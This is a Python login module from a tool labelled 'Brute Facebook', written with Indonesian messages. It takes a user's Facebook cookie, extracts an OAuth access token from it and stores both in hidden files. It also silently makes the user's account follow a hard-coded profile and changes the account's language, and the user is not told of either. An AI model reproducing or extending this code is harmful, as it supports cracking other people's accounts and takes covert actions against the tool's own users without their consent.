#######################################################
# Name           : Brute Facebook (BF)                #
# File           : cokz.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 3.11                               #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, time

from bs4 import BeautifulSoup as par
from yxz.loading_rich import Load
from yxz.logo import Logo
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#--------------------------------------------
class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.war=random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
        self.menu()

    def menu(self):
        Logo();prints(Panel("[italic bold green]silahkan masukan cookie anda, disarankan menggunakan akun tumbal, jika tetap invalid, gunakan akun tumbal dengan id 10008 kebawah, gunakan mode dekstop pada browser saat pengambilan cookies.", style="bold white", width=70, title="[italic bold red]CATATAN"))
        coki = input(f"[{O}?{N}] cookie fb :{H} ")
        self.login_cokie(coki)
 
    def login_cokie(self, cok):
        Load().cek_coki();self.ubah_bahasa(cok)
        try:
            self.maling_pangsit(cok)
            self.ses.headers.update({'Accept-Language': 'id,en;q=0.9', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Referer': 'https://www.instagram.com/', 'Host': 'www.facebook.com', 'Sec-Fetch-Mode': 'cors', 'Accept': '*/*', 'Connection': 'keep-alive', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Dest': 'empty', 'Origin': 'https://www.instagram.com', 'Accept-Encoding': 'gzip, deflate',})
            response = self.ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/yayanxd_/', cookies={'cookie':cok})
            if '"access_token":' in str(response.headers):
                token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                open("assets/.cokie.txt", "w").write(cok);open("assets/.token.txt", "w").write(token)
                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py")
            else:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
        except requests.exceptions.ConnectionError:prints(Panel("😭[bold red] Tidak ada koneksi internet", style="bold white", width=70));time.sleep(3);self.menu()
        except (KeyError,AttributeError):prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
        #except Exception as e:exit(e)

    def maling_pangsit(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):pass
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
            else:pass
        except:pass

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python run.py[/]", style="bold white", width=70));exit()
        except:exit()

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies={"cookie":cok}).text
            data = par(link, "html.parser")
            for x in data.find_all("form",{"method":"post"}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit": "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies={"cookie":cok})
        except:pass